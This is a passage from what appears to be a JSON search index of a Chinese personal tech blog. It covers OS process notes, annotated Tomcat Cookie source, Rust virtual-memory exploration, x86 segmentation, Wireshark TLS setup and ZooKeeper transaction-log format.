process has performmed some kind of operation that makes it not ready to run until some other event takes place. A common example: when a process initiates an I/O request to a disk, it becomes blocked and thus some other process can use the processor","reference#reference":" linux process\nthree easy pieces\nfile descriptor\nxv6-proc\n中断","summary#summary":"low-level(mechanisms) 实现进程功能\nhigh-level(policies)  调度策略\n机制和策略合在一起, 实现 CPU 的虚拟化","the-abstracttion-a-process#the abstracttion: a process":"address space 存放程序的 instructions 和 data.\nprogram counter 程序寄存器, 为了实现 process 的 stop 和 run, 需要知道执行到哪一条指令了.\nstack pointer function parameters, local variables, return addresses\nio 进程默认打开 stdin(0), stdout(1), stderr(2) 这三个 file descriptor."},"title":"three-easy-pieces-4-process"},"/blog/tomcat-http-cookie/":{"data":{"":" package javax.servlet.http; import java.io.Serializable; import java.security.AccessController; import java.security.PrivilegedAction; import java.text.MessageFormat; import java.util.BitSet; import java.util.Locale; import java.util.ResourceBundle; /** * Creates a cookie, a small amount of information sent by a servlet to a Web * browser, saved by the browser, and later sent back to the server. * 创建一个 cookie， servlet 发给浏览器的一个小信息，被浏览器保存。之后再发送给服务器。 * * A cookie's value can uniquely identify a client, so cookies are commonly used for * session management. * 一个 cookie 的值可以单独的标记出一个客户端，所以 cookies 一般被用来 session 管理。因为 * http 是一个 stateless 的协议。 * * \u003cp\u003e * A cookie has a name, a single value, and optional attributes such as a * comment, path and domain qualifiers, a maximum age, and a version number. * 一个 cookie 有一个 name，一个单独的 value，还有一些可选的属性，比如 注释，路径，域标记 * 最大存活时间和一个版本号。 * document.cookie 可以得到 httponly = false 的 cookie * * * Some Web browsers have bugs in how they handle the optional attributes, so * use them sparingly to improve the interoperability of your servlets. * 一些 web browsers 在处怎样处理可选的属性有 bugs。提高 servlets 的互操作性，请慎用。 * \u003cp\u003e * The servlet sends cookies to the browser by using the * {@link HttpServletResponse#addCookie} method, which adds fields to HTTP * response headers to send cookies to the browser, one at a time. The browser * is expected to support 20 cookies for each Web server, 300 cookies total, and * may limit cookie size to 4 KB each. * servlet 用 HttpServletResponse#addCookie 向 http 的相应头添加 field, 之后发送给浏览器. * 浏览器支持每一个 web server 保存 20 个 cookie. 每一个 cookie 的 size 可能被限制为 4 * * \u003cp\u003e * The browser returns cookies to the servlet by adding fields to HTTP request * headers. * 浏览器通过向 http 请求头添加 cookies 的方式返回给服务器. * * Cookies can be retrieved from a request by using the * {@link HttpServletRequest#getCookies} method. Several cookies might have the * same name but different path attributes. * 服务器通过 HttpServletRequest#getCookies 从请求中提取 cookies. * 一些 cookie 可能有相同的 name 但是有不同的 path attribute. * * \u003cp\u003e * Cookies affect the caching of the Web pages that use them. HTTP 1.0 does not * cache pages that use cookies created with this class. This class does not * support the cache control defined with HTTP 1.1. * \u003cp\u003e * This class supports both the RFC 2109 and the RFC 6265 specifications. * * By default, cookies are created using RFC 6265. * 默认的, cookie 生成方式采用 RFC 6265. 本质所有的 Cookie 都是按规范生成的. */ public class Cookie implements Cloneable, Serializable { // 校验 Cookie name private static final CookieNameValidator validation; static { boolean strictServletCompliance; // 严格的 servlet boolean strictNaming; boolean allowSlash; String propStrictNaming; String propFwdSlashIsSeparator; if (System.getSecurityManager() == null) { strictServletCompliance = Boolean.getBoolean( \"org.apache.catalina.STRICT_SERVLET_COMPLIANCE\"); propStrictNaming = System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.STRICT_NAMING\"); propFwdSlashIsSeparator = System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.FWD_SLASH_IS_SEPARATOR\"); } else { strictServletCompliance = AccessController.doPrivileged( new PrivilegedAction\u003cBoolean\u003e() { @Override public Boolean run() { return Boolean.valueOf(System.getProperty( \"org.apache.catalina.STRICT_SERVLET_COMPLIANCE\")); } } ).booleanValue(); propStrictNaming = AccessController.doPrivileged( new PrivilegedAction\u003cString\u003e() { @Override public String run() { return System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.STRICT_NAMING\"); } } ); propFwdSlashIsSeparator = AccessController.doPrivileged( new PrivilegedAction\u003cString\u003e() { @Override public String run() { return System.getProperty( \"org.apache.tomcat.util.http.ServerCookie.FWD_SLASH_IS_SEPARATOR\"); } } ); } if (propStrictNaming == null) { strictNaming = strictServletCompliance; } else { strictNaming = Boolean.parseBoolean(propStrictNaming); } if (propFwdSlashIsSeparator == null) { allowSlash = !strictServletCompliance; } else { allowSlash = !Boolean.parseBoolean(propFwdSlashIsSeparator); } if (strictNaming) { validation = new RFC2109Validator(allowSlash); } else { validation = new RFC6265Validator(); } } private static final long serialVersionUID = 1L; private final String name; // cookie name 一旦创建不能被修改 private String value; // cookie value private int version = 0; // ;Version=1 ... means RFC 2109 style // 默认的是 RFC 6265 // // Attributes encoded in the header's cookie fields. // private String comment; // ;Comment=VALUE ... describes cookie's use private String domain; // ;Domain=VALUE ... domain that sees cookie 可以看到 cookie 的 domain private int maxAge = -1; // ;Max-Age=VALUE ... cookies auto-expire private String path; // ;Path=VALUE ... URLs that see the cookie 可以看到 cookie 的 urls private boolean secure; // ;Secure ... e.g. use SSL 启用 ssl private boolean httpOnly; // Not in cookie specs, but supported by browsers 不在 cookie 规范里, 但是被浏览器支持 /** * Constructs a cookie with a specified name and value. * \u003cp\u003e * The name must conform to RFC 2109. cookie name 必须遵循 RFC 2109. 没办法,规范就是牛啊 * That means it can contain only ASCII * alphanumeric characters and cannot contain commas, semicolons, or white * space or begin with a $ character. The cookie's name cannot be changed * after creation. * 这意味着 cookie name 只能包含 ASCII 的字母, 数字, 不能包括逗号, 分号, 空格, 或者以 * $ 开头. cookie name 一旦创建不能被修改. * * \u003cp\u003e * The value can be anything the server chooses to send. Its value is * probably of interest only to the server. The cookie's value can be * changed after creation with the \u003ccode\u003esetValue\u003c/code\u003e method. * server 可以通过 cookie value 发送任何东西. * \u003cp\u003e * By default, cookies are created according to the Netscape cookie * specification. The version can be changed with the * \u003ccode\u003esetVersion\u003c/code\u003e method. * * @param name * a \u003ccode\u003eString\u003c/code\u003e specifying the name of the cookie * @param value * a \u003ccode\u003eString\u003c/code\u003e specifying the value of the cookie * @throws IllegalArgumentException * if the cookie name contains illegal characters (for example, * a comma, space, or semicolon) or it is one of the tokens * reserved for use by the cookie protocol * @see #setValue * @see #setVersion */ public Cookie(String name, String value) { // 首先进行 cookie name 的校验 validation.validate(name); this.name = name; this.value = value; } /** * Specifies a comment that describes a cookie's purpose. * 描述这个 cookie 的目的 * The comment is useful if the browser presents the cookie to the user. Comments are not * supported by Netscape Version 0 cookies. * * @param purpose * a \u003ccode\u003eString\u003c/code\u003e specifying the comment to display to the * user * @see #getComment */ public void setComment(String purpose) { comment = purpose; } /** * Returns the comment describing the purpose of this cookie, or * \u003ccode\u003enull\u003c/code\u003e if the cookie has no comment. * * @return a \u003ccode\u003eString\u003c/code\u003e containing the comment, or * \u003ccode\u003enull\u003c/code\u003e if none * @see #setComment */ public String getComment() { return comment; } /** * Specifies the domain within which this cookie should be presented. * 指定这个 cookie 可以出现在那个 domain * \u003cp\u003e * The form of the domain name is specified by RFC 2109. A domain name * begins with a dot (\u003ccode\u003e.foo.com\u003c/code\u003e) and means that the cookie is * visible to servers in a specified Domain Name System (DNS) zone (for * example, \u003ccode\u003ewww.foo.com\u003c/code\u003e, but not \u003ccode\u003ea.b.foo.com\u003c/code\u003e). By * default, cookies are only returned to the server that sent them. * * domain name 的形式说明在 RFC 2109. domain name 以 dot 开头, 这意味着在一个特定的 * DNS 这个 cookie 是可见的. 默认的, 那个服务器发送的 cookie 返回给哪个服务器. * * @param pattern * a \u003ccode\u003eString\u003c/code\u003e containing the domain name within which * this cookie is visible; form is according to RFC 2109 * @see #getDomain */ public void setDomain(String pattern) { domain = pattern.toLowerCase(Locale.ENGLISH); // IE allegedly needs this } /** * Returns the domain name set for this cookie. The form of the domain name * is set by RFC 2109. * * @return a \u003ccode\u003eString\u003c/code\u003e containing the domain name * @see #setDomain */ public String getDomain() { return domain; } /** * Sets the maximum age of the cookie in seconds. * cookie 最大存活的秒数 * \u003cp\u003e * A positive value indicates that the cookie will expire after that many * seconds have passed. Note that the value is the \u003ci\u003emaximum\u003c/i\u003e age when * the cookie will expire, not the cookie's current age. * 一个正数表明 cookie 将在 maximun age 秒数后过期. * \u003cp\u003e * A negative value means that the cookie is not stored persistently and * will be deleted when the Web browser exits. A zero value causes the * cookie to be deleted. * * 一个负数表示 cookie 不会被永久存储, 浏览器退出时将被删除. * 0 删除这个 cookie * * @param expiry * an integer specifying the maximum age of the cookie in * seconds; if negative, means the cookie is not stored; if zero, * deletes the cookie * @see #getMaxAge */ public void setMaxAge(int expiry) { maxAge = expiry; } /** * Returns the maximum age of the cookie, specified in seconds, By default, * \u003ccode\u003e-1\u003c/code\u003e indicating the cookie will persist until browser * shutdown. * * @return an integer specifying the maximum age of the cookie in seconds; if * negative, means the cookie persists until browser shutdown * @see #setMaxAge */ public int getMaxAge() { return maxAge; } /** * Specifies a path for the cookie to which the client should return the * cookie. * 指定一个 path, 表示哪一个 client 应该把这个 cookie 返还给服务器. * * \u003cp\u003e * The cookie is visible to all the pages in the directory you specify, and * all the pages in that directory's subdirectories. A cookie's path must * include the servlet that set the cookie, for example, \u003ci\u003e/catalog\u003c/i\u003e, * which makes the cookie visible to all directories on the server under * \u003ci\u003e/catalog\u003c/i\u003e. * \u003cp\u003e * Consult RFC 2109 (available on the Internet) for more information on * setting path names for cookies. * * @param uri * a \u003ccode\u003eString\u003c/code\u003e specifying a path * @see #getPath */ public void setPath(String uri) { path = uri; } /** * Returns the path on the server to which the browser returns this cookie. * The cookie is visible to all subpaths on the server. * * @return a \u003ccode\u003eString\u003c/code\u003e specifying a path that contains a servlet * name, for example, \u003ci\u003e/catalog\u003c/i\u003e * @see #setPath */ public String getPath() { return path; } /** * Indicates to the browser whether the cookie should only be sent using a * secure protocol, such as HTTPS or SSL. * \u003cp\u003e * The default value is \u003ccode\u003efalse\u003c/code\u003e. * * @param flag * if \u003ccode\u003etrue\u003c/code\u003e, sends the cookie from the browser to the * server only when using a secure protocol; if * \u003ccode\u003efalse\u003c/code\u003e, sent on any protocol * @see #getSecure */ public void setSecure(boolean flag) { secure = flag; } /** * Returns \u003ccode\u003etrue\u003c/code\u003e if the browser is sending cookies only over a * secure protocol, or \u003ccode\u003efalse\u003c/code\u003e if the browser can send cookies * using any protocol. * * @return \u003ccode\u003etrue\u003c/code\u003e if the browser uses a secure protocol; * otherwise, \u003ccode\u003etrue\u003c/code\u003e * @see #setSecure */ public boolean getSecure() { return secure; } /** * Returns the name of the cookie. The name cannot be changed after * creation. * * @return a \u003ccode\u003eString\u003c/code\u003e specifying the cookie's name */ public String getName() { return name; } /** * Assigns a new value to a cookie after the cookie is created. If you use a * binary value, you may want to use BASE64 encoding. * cookie 被创建后, 给 value 指定一个值. 如果使用二进制的值, 采用 BASE64 的编码方式. * * \u003cp\u003e * With Version 0 cookies, values should not contain white space, brackets, * parentheses, equals signs, commas, double quotes, slashes, question * marks, at signs, colons, and semicolons. Empty values may not behave the * same way on all browsers. * * @param newValue * a \u003ccode\u003eString\u003c/code\u003e specifying the new value * @see #getValue * @see Cookie */ public void setValue(String newValue) { value = newValue; } /** * Returns the value of the cookie. * * @return a \u003ccode\u003eString\u003c/code\u003e containing the cookie's present value * @see #setValue * @see Cookie */ public String getValue() { return value; } /** * Returns the version of the protocol this cookie complies with. Version 1 * complies with RFC 2109, and version 0 complies with the original cookie * specification drafted by Netscape. Cookies provided by a browser use and * identify the browser's cookie version. * * @return 0 if the cookie complies with the original Netscape specification; * 1 if the cookie complies with RFC 2109 被 RFC 6265 淘汰 * @see #setVersion */ public int getVersion() { return version; } /** * Sets the version of the cookie protocol this cookie complies with. * Version 0 complies with the original Netscape cookie specification. * version 0 遵守原始的 netscape cookie 说明 * Version 1 complies with RFC 2109. * version 1 遵守 RFC 2109 规范 * \u003cp\u003e * Since RFC 2109 is still somewhat new, consider version 1 as experimental; * do not use it yet on production sites. * * @param v * 0 if the cookie should comply with the original Netscape * specification; 1 if the cookie should comply with RFC 2109 * @see #getVersion */ public void setVersion(int v) { version = v; } /** * Overrides the standard \u003ccode\u003ejava.lang.Object.clone\u003c/code\u003e method to * return a copy of this cookie. */ @Override public Object clone() { try { return super.clone(); } catch (CloneNotSupportedException e) { throw new RuntimeException(e); } } /** * Sets the flag that controls if this cookie will be hidden from scripts on * the client side. * * true 不能被 js document.cookie 操作 * * @param httpOnly The new value of the flag * * @since Servlet 3.0 */ public void setHttpOnly(boolean httpOnly) { this.httpOnly = httpOnly; } /** * Gets the flag that controls if this cookie will be hidden from scripts on * the client side. * * @return \u003ccode\u003etrue\u003c/code\u003e if the cookie is hidden from scripts, else * \u003ccode\u003efalse\u003c/code\u003e * @since Servlet 3.0 */ public boolean isHttpOnly() { return httpOnly; } } class CookieNameValidator { // 拿到 properties 文件的方法 ResourceBundle private static final String LSTRING_FILE = \"javax.servlet.http.LocalStrings\"; protected static final ResourceBundle lStrings = ResourceBundle.getBundle(LSTRING_FILE); protected final BitSet allowed; protected CookieNameValidator(String separators) { allowed = new BitSet(128); allowed.set(0x20, 0x7f); // any CHAR except CTLs or separators for (int i = 0; i \u003c separators.length(); i++) { char ch = separators.charAt(i); allowed.clear(ch); } } void validate(String name) { // cookie name 不允许为 null 或者长度为 0 if (name == null || name.length() == 0) { throw new IllegalArgumentException(lStrings.getString(\"err.cookie_name_blank\")); } if (!isToken(name)) { String errMsg = lStrings.getString(\"err.cookie_name_is_token\"); throw new IllegalArgumentException(MessageFormat.format(errMsg, name)); } } private boolean isToken(String possibleToken) { int len = possibleToken.length(); for (int i = 0; i \u003c len; i++) { char c = possibleToken.charAt(i); if (!allowed.get(c)) { return false; } } return true; } } class RFC6265Validator extends CookieNameValidator { private static final String RFC2616_SEPARATORS = \"()\u003c\u003e@,;:\\\\\\\"/[]?={} \\t\"; RFC6265Validator() { super(RFC2616_SEPARATORS); } } class RFC2109Validator extends RFC6265Validator { RFC2109Validator(boolean allowSlash) { // special treatment to allow for FWD_SLASH_IS_SEPARATOR property if (allowSlash) { allowed.set('/'); } } @Override void validate(String name) { super.validate(name); // cookie name 不允许 $ 开头 if (name.charAt(0) == '$') { String errMsg = lStrings.getString(\"err.cookie_name_is_token\"); throw new IllegalArgumentException(MessageFormat.format(errMsg, name)); } } } "},"title":"tomcat-http-cookie"},"/blog/tools-for-me/":{"data":{"assembly#assembly":"","base64#base64":"","code-format#code format":"","company#company":"programmingjava decompiler-Luyten decompiler-cfr byte-code-viewer jclasslib assembly godbolt json json-runoob json-online regexp regexp-jex.im regexp-regexr regexp-regexper hex hex converter hex editor html html beautify base64 base64 code format code format url json format unicode unicode for you shell oh-my-zsh starship workingpc snipaste mubu process on screen-recorder reinstall os multibootusb universal usb installer rufus entertainmentvideo online downloader-you-get downloader-motrix downloader-Xdown converter audio-converter movie cupfox agmov picture waifu2x papers-anwanqi ilovepapers file ilovepdf html to pdf typing practice typing https://qwerty.kaiyi.cool/ jobcompany tianyancha resume 木及简历 ","entertainment#entertainment":"","file#file":"","hex#hex":"","html#html":"","java#java":"","job#job":"","json#json":"","movie#movie":"","pc#pc":"","picture#picture":"","programming#programming":"","regexp#regexp":"","reinstall-os#reinstall os":"","shell#shell":"","typing#typing":"","unicode#unicode":"","video#video":"","working#working":""},"title":"tools-for-me"},"/blog/ubuntu18-04-install-openjdk8/":{"data":{"安装-openjdk8#安装 openjdk8":"","执行更新#执行更新":"","添加-openjdk8-的第三方源#添加 openjdk8 的第三方源":"","确认安装成功#确认安装成功":"添加 openjdk8 的第三方源 sudo add-apt-repository ppa:openjdk-r/ppa ppa (Personal Package Achives)\n执行更新 apt-get update\n安装 openjdk8 sudo apt-get install openjdk-8-jdk\n选择版本 sudo update-alternatives - -config java\n确认安装成功 java -version","选择版本#选择版本":""},"title":"ubuntu18.04-install-openjdk8"},"/blog/virtual-memory-address-explore/":{"data":{"heap#heap":"556a8c01b000-556a8c03c000 可以看到 heap 的地址，是比较小的地址段。","heap-与-stack-会不会相互覆盖#heap 与 stack 会不会相互覆盖？":"查看 /proc/pid/maps 计算：\n(low address stack - high address heap) / 1024 / 1024 /1024 / 1024 = (0x7ffe91c09000 - 0x556a8c03c000) / 1024 / 1024 /1024 / 1024 = 42TB 可以看出相差有 42TB 的空间。就算真的覆盖了，内核会终止这个程序。这也就是虚拟内存的作用之一，程序可以使用远远超过实际物理内存的空间。","procpidmaps#/proc/pid/maps":" stardust@os:x86_64-linux-gnu$ pidof vas-explore 75599 stardust@os:x86_64-linux-gnu$ cat /proc/75599/maps 556a8a831000-556a8a837000 r--p 00000000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8a837000-556a8a86e000 r-xp 00006000 08:12 815699 /home/stardust/Desktop/rust/ vas-explore/target/debug/vas-explore # text(code segment) segment 556a8a86e000-556a8a87c000 r--p 0003d000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8a87d000-556a8a880000 r--p 0004b000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8a880000-556a8a881000 rw-p 0004e000 08:12 815699 /home/stardust/Desktop/rust/vas-explore/target/debug/vas-explore 556a8c01b000-556a8c03c000 rw-p 00000000 00:00 0 [heap] # heap segment 7f5e59636000-7f5e59638000 rw-p 00000000 00:00 0 7f5e59638000-7f5e5965a000 r--p 00000000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e5965a000-7f5e597d2000 r-xp 00022000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e597d2000-7f5e59820000 r--p 0019a000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e59820000-7f5e59824000 r--p 001e7000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e59824000-7f5e59826000 rw-p 001eb000 08:12 533486 /lib/x86_64-linux-gnu/libc-2.31.so 7f5e59826000-7f5e5982a000 rw-p 00000000 00:00 0 7f5e5982a000-7f5e5982b000 r--p 00000000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982b000-7f5e5982d000 r-xp 00001000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982d000-7f5e5982e000 r--p 00003000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982e000-7f5e5982f000 r--p 00003000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e5982f000-7f5e59830000 rw-p 00004000 08:12 533487 /lib/x86_64-linux-gnu/libdl-2.31.so 7f5e59830000-7f5e59836000 r--p 00000000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e59836000-7f5e59847000 r-xp 00006000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e59847000-7f5e5984d000 r--p 00017000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e5984d000-7f5e5984e000 r--p 0001c000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e5984e000-7f5e5984f000 rw-p 0001d000 08:12 533569 /lib/x86_64-linux-gnu/libpthread-2.31.so 7f5e5984f000-7f5e59853000 rw-p 00000000 00:00 0 7f5e59853000-7f5e59856000 r--p 00000000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e59856000-7f5e59868000 r-xp 00003000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e59868000-7f5e5986c000 r--p 00015000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e5986c000-7f5e5986d000 r--p 00018000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e5986d000-7f5e5986e000 rw-p 00019000 08:12 531127 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f5e5986e000-7f5e59870000 rw-p 00000000 00:00 0 7f5e59885000-7f5e59886000 ---p 00000000 00:00 0 7f5e59886000-7f5e59888000 rw-p 00000000 00:00 0 7f5e59888000-7f5e59889000 r--p 00000000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e59889000-7f5e598ac000 r-xp 00001000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598ac000-7f5e598b4000 r--p 00024000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598b5000-7f5e598b6000 r--p 0002c000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598b6000-7f5e598b7000 rw-p 0002d000 08:12 533138 /lib/x86_64-linux-gnu/ld-2.31.so 7f5e598b7000-7f5e598b8000 rw-p 00000000 00:00 0 7ffe91c09000-7ffe91c2a000 rw-p 00000000 00:00 0 [stack] # stack segment 7ffe91c38000-7ffe91c3b000 r--p 00000000 00:00 0 [vvar] 7ffe91c3b000-7ffe91c3c000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] ","references#References":" /proc/pid/maps virtual memory address space Memory_Management_in_Linux ","row-format#row format":"","rust-程序内存布局分析#rust 程序内存布局分析":" static MAX: u32 = 0; fn foo() {} fn main() { let hello = \"hello world\".to_string(); let data = Box::new(1); // string literals 指向 RODATA section 地址 println!(\"RODATA: {:p}\", \"hello world!\"); // static 变量在 DATA section println!(\"DATA: (static var): {:p}\", \u0026MAX); // function 在 TEXT section println!(\"TEXT: (function):{:p}\", foo as *const ()); // string 结构体分配在栈上，所以其引用是指向的是一个栈地址 println!(\"STACK: (\u0026hello):{:p}\", \u0026hello); // 通过 deference 获取指向的 heap 上的数据，然后获取其引用 println!(\"HEAP: (\u0026(*hello)):{:p}\", \u0026(*hello)); // Box 实现了 Pointer trait, 无须额外 deference println!(\"HEAP: (Box impl Pointer trait){:p},{:p}\", data, \u0026(data)); } 查看变量在虚拟内存中的分布 cargo run Compiling stack-or-heap v0.1.0 (/Users/stardust/Downloads/rust-projects/stack-or-heap) Finished dev [unoptimized + debuginfo] target(s) in 0.48s Running `target/debug/stack-or-heap` RODATA: 0x106df1090 DATA: (static var): 0x106df1080 TEXT: (function):0x106db61b0 STACK: (\u0026hello):0x7ff7b9149950 HEAP: (\u0026(*hello)):0x60000346c050 HEAP: (Box impl Pointer trait)0x60000346c060,0x7ff7b9149968 ","stack#stack":"栈区，从 maps 可以看到 7ffe91c09000-7ffe91c2a000，这个区域是这个进程的栈区，可读、可写。7ffe91c09000 这个 48bits 的地址就是虚拟内存地址。为什么是 48bits，因为 amd64 的虚拟地址用 48bits(256TB)地址空间足够了。","text#text":"代码段，程序的可执行代码在这里。","virtual-memory-address-space-layout#virtual memory address space layout":"","virtual-memory-是啥#virtual memory 是啥？":"virtual memory 是啥？ 本质是硬件支持。 virtual memory ===== MMU =====\u003e physical memory OS + 硬件 共同为进程提供 virtual memory 功能。所有程序的内存布局一致。 为了安全。 ","代码测试#代码测试":" cargo new vas-explore main.rs\nuse std::{thread,time}; fn main() { println!(\"Hello, world!\"); let sl = time::Duration::from_millis(10000000); thread::sleep(sl); println!(\"Goodbye, world!\"); } cargo build ./target/debug/vas-explore pidof vas-explore "},"title":"Virtual Memory Address Explore"},"/blog/what-happens-type-url-into-browser-and-press-enter/":{"data":{"":"","arp-获取-gateway-的-mac-地址#arp 获取 gateway 的 mac 地址":"","dns-query#dns query":"get the ip of the target domain\nbrowser cache firefox(about:networking#dns) /etc/hosts os cache macos 查看 dns 请求日志 sudo log stream –predicate ‘process == “mDNSResponder”’ –info dns resolver /etc/resolv.conf\narp -a 查看有没有 dns 服务器的 mac 地址 ARP request for the nameserver send dns query to get the ip of the domain ","references#References":" keyborad-interrput Chrome 是怎么判断地址栏输入的东西是不是网址? 这就是第一步😂-omnibox firefox dns ARP ","向-gateway-发送-ip-packet#向 gateway 发送 ip packet":""},"title":"What-happens-type-url-into-browser-and-press-enter"},"/blog/wireshark/":{"data":{"":"","wireshark-windows-配置-ssl#Wireshark Windows 配置 SSL":" Version 3.0.3\n配置 SSLKEYLOGFILE 系统变量 配置 Wireshark 编辑 -\u003e 首选项 -\u003e Protocols -\u003e TLS 重启 Wireshark ","过滤器查看#过滤器查看":" 视图 -\u003e 内部 -\u003e 支持的协议"},"title":"wireshark"},"/blog/x86-64-architecture/":{"data":{"":" 操作系统其实很大一部分面向 CPU 来编程的。一些 OS 的概念直接来源于 CPU 的术语，或者和 CPU 关联性非常大。要想彻底理解 OS ，无法绕过 CPU。因为 Intel 的 X86(Intel 80386 之后的一系列 CPU 称之为 X86 架构) 是业界的标准。掌握这个架构对于理解 OS 是非常必要的。因为 X86 系列的 CPU 向后兼容，所以本文使用 Intel 8086(16 bit) 和 Intel 80386(32 bit) 来试图理解 X86 架构。","intel-80386#Intel 80386":"","intel-8086#Intel 8086":"16 bit processor 16-bit is a computer hardware device or software program capable of transferring 16 bits of data at a time. 一次传输 16 bits 的数据 For example, early computer processors (e.g., 8088 and 80286) were 16-bit processors, meaning they were capable of working with 16-bit binary numbers (decimal number up to 65,535). Anything larger and the computer would need to break the number into smaller pieces.\n1M 的寻址空间带来的问题与解决方法 Intel 8086 地址引脚 #(Intel 8086 寻址空间)\n上图的 AD0 ~ AD15 是复用(Multiplex)引脚 A16 ~ A19 也是复用引脚\nALE(Address Latch Enable) = 1 是作为地址线 A0~A15(寻址) 再加上A16 ~ A19. ALE(Address Latch Enable) = 0 是作为数据线 D0~D15(传输 16 bit 数据) 物理地址生成 20 bit 来表示一个内存地址. 但是 Intel 8086 是一个 16 bit 的处理器(其实就是一次只能传输 16 bit 的数据). 怎样来表示 20 bit 的内存地址呢? 比如一个内存地址是: 0x18AC9, 该怎样表示呢? 其实道理很简单, 既然没法一次传输 20 bit, 那就分两次好了. 最后用两个 16 bit 的数据来合成 0x18AC9 这个地址. 很显然要有生成 0x18AC9 这个地址的策略. 在 Intel 8086 中, 将 0x18AC9 拆分为 0x1234(segment address) 和 0x6789(offset address) 这两个 16 bit 的地址, 这就是所谓的逻辑地址(logical address). 怎样生成 0x18AC9 这个真实的物理地址呢? 也很简单使用一个 20 bit 的 adder(加法器). 0x18AC9 = 0x1234 * 16 + 0x6789\nReal Address Mode 物理地址由两部分组成: segment address 和 offset address. 这两个地址不能直接使用, 是用来合成真正的物理地址的. 这两个地址称之为 逻辑地址. 16 * segment address + offset address 合成的地址称之为 物理地址, 也叫 线性地址(也就是从 0 ~ 2^20 -1 地址空间). Intel 8086 这种得到物理地址的机制就叫做 real address mode. 也就是所谓的 实模式. PS: 多说一句, 实模式 这个翻译有点坑, 翻译成 实地址模式 不就十分清楚了吗?\nsegmented memory physical address = 16 * segment address + offset address offset address 是 16 bit, 决定了一个 segment 的范围是 64K. 将 1M 的寻址空间以 64K 为一个 segment 划分为多个 segment. 反过来说就是一个 segment 可以选择一个 64K 范围内的地址. 是的, segment 可以当作是一种 selector, 就像 CSS 里面的选择器. 那么这个 segment 存放在哪里呢? 放在专门的 segment register 里.\nsegment registers Intel 8086 提供了 Extra Segment(ES), Data Segment(DS), Stack Segment(SS), Code Segment(CS) 这 4 个 段寄存器.\ncode segment(CS) + instruction pointer(IP) code segment 存放 segment address, 这是个专门的代码段寄存器, 用来存放代码的地址. instruction pointer 存放 offset address, 这个是专门的指令寄存器, 用来存放下一条指令的地址. 所以访问代码的 物理地址 = 16 * CS + IP\nstack segment(SS) + stack pointer(SP) stack segment 存放 segment address, 这个是专门的栈帧段寄存器. stack pointer 存放 offset address, 这个专门的记录栈顶的寄存器. 所以访问函数栈帧的 物理地址 = 16 * SS + SP\n注意: 如果令 SS = 0, 那么访问函数栈帧的 物理地址 = SP, 也就是只能访问 64K 的空间. 注意: real address mode 能够不受限制地访问 1M 的地址空间. 程序可以自由的访问 1M 的地址空间, 无法进行内存的保护, 这也是 Intel 80386 要解决的问题之一.\ngeneral purpose register memory mapping 已安装内存 8G(7.88G) 可用？？？原因在哪里呢？","reference#Reference":" bus interface unit execution unit 8086 Functional Units components of cpu 8086-microprocessor-architecture 8086-microprocessor memory-segmentation-8086-microprocessor Advanced Microcomputer Programming 16 bit processor mean? memory layout x86-overview 计算机位数发展 "},"title":"x86-64-architecture"},"/blog/zookeeper-transaction-log/":{"data":{"log-二进制文件图解#log 二进制文件图解":"\nlog.500000004 怎么来的？ 可以看到 txn log 文件，写入的第一个 transaction 的 zxid 就是 0x0000000500000004。这个就是 log.500000004 的由来。\n什么是 zxid？ 文件结构 第一行 FileHeader。 第二行开始是 transaction log, 每一个 transaction log 用 0x42 作为 EOF。可以知道 log.500000004有 6 个 transaction。 剩余的是 Zero Pad。 transaction(txn) 类型 仅分析 log.500000004中的 6 个。还有其他类型的 txn。\ntransaction 代码位置 zookeeper-jute 中 org.apache.zookeeper.txn 下, 这个是 jute compiler 生成的一系列类。\ncreate session txn 第 1 个 txn 的 type= 0xfffffff6=-10\nOpCode=-10\ncreate txn 第 2 个 txn 的 type= 0x00000001=1\nOpCode=1\nset data txn 第 3、4 个 txn 的 type= 0x00000005=5\nOpCode=5\ndelete txn 第 5 个 txn 的 type= 0x00000002=2\nOpCode=2\nclose session txn 第 6 个 txn 的 type= 0xfffffff5=-11\nOpCode=-11","log500000004-文件分析#\u003ccode\u003elog.500000004\u003c/code\u003e 文件分析":" 分析的 zookeeper 代码版本为 3.9.1 。 zookeer 的 transaction log 为二进制文件，采用的是大端序。\nzookeeper 数据持久化的功能在 zookeeper/server/persistence 下。\n解析日志就可以获取 zookeeper 的数据。可以用来实现实时备份到另一个独立的 zookeeper 集群。\n日志文件命名规则 /** * Creates a valid transaction log file name. * * @param zxid used as a file name suffix (extension) * @return file name */ public static String makeLogName(long zxid) { return FileTxnLog.LOG_FILE_PREFIX + \".\" + Long.toHexString(zxid); } 日志文件布局由 File Header、TxnList、ZeroPad 